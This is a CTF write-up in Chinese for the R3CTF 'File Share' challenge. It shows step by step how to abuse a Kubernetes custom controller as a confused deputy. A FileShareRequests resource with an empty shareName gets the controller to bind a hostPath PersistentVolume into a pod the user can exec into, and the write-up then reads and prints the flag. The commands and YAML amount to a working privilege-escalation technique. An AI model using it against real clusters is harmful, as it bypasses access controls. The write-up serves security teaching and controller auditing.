# File Share

## 题目简述

服务提供一份 Kubernetes 访问凭据，所在命名空间为 `shares`。账户不能直接创建任意 Pod，但可以查看集群存储资源、创建自定义资源 `FileShareRequests`，并对控制器生成的 Pod 执行 `pods/exec`。

集群中预置了一个名为 `flagpv` 的可用 PersistentVolume：

```text
Capacity:     1Gi
Access Mode:  ROX / ReadOnlyMany
Reclaim:      Retain
HostPath:     /flag
```

目标是诱导 FileShare 控制器把这个已有 PV 绑定到自己可 exec 的 Pod。

## 解题过程

先确认当前身份、命名空间和权限：

```bash
kubectl auth can-i --list -n shares
kubectl get pv
kubectl get fsr,fs,pvc -n shares
kubectl describe pv flagpv
```

权限列表中关键能力是：

- `get/list` PersistentVolume；
- `create/update/delete` `filesharerequests`；
- 查看 `fileshares` 与 PVC；
- `create` 或控制器间接创建工作负载；
- `pods/exec`。

不要盲猜 CRD 字段。API Server 已保存结构 schema，可用：

```bash
kubectl explain filesharerequests
kubectl explain fsr.spec
```

得到三个必填字段：

```text
accessModes  []string
shareName    string
storage      string，且小于 1Gi
```

提交下面的自定义资源：

```yaml
apiVersion: ctf.r3kapig.com/v1
kind: FileShareRequests
metadata:
  name: getflag
  namespace: shares
spec:
  accessModes:
    - ReadOnlyMany
  shareName: ""
  storage: 100Mi
```

这里最重要的是 `shareName` 必须存在但值为空字符串。非空名称会让控制器按名称创建或选择另一份共享；空名称则进入“寻找满足容量与 access mode 的现有可用 PV”路径。`flagpv` 的 1Gi 容量大于请求的 100Mi，且 `ReadOnlyMany` 完全匹配，所以会被绑定。

应用后观察控制器产物：

```bash
kubectl apply -f getflag.yaml
kubectl get fsr,fs,pvc,pod -n shares
kubectl describe fs getflag-fileshare -n shares
```

控制器会生成 `getflag-fileshare` 和 `getflag-pod`，并把卷挂载到 `/my-sharefile`。利用已有 `pods/exec` 权限直接读取：

```bash
kubectl exec -n shares getflag-pod -- \
  cat /my-sharefile/flag.txt
```

得到：

```text
R3CTF{PVC_1s_n0t_fu00y_033c2a7ba5ed}
```

控制器字段、空 `shareName` 分支和实际资源输出可参考 [R3CTF File Share 赛后复现](https://blog.shenghuo2.top/posts/8c57880/)。本文已经包含无需外链即可操作的 RBAC 侦察、CRD schema、完整 YAML、绑定条件和读取路径。

## 方法总结

这道题不是容器逃逸，而是 Kubernetes 控制器的 confused deputy：低权限用户不能直接挂载主机目录，却能创建高权限控制器信任的 CRD，请求控制器代为选择 PV、创建 PVC 和 Pod。审计自定义控制器时必须把 CRD 写权限视为间接基础设施权限；空字符串、默认值和“自动选择已有资源”分支尤其容易跨越原有 RBAC 边界。
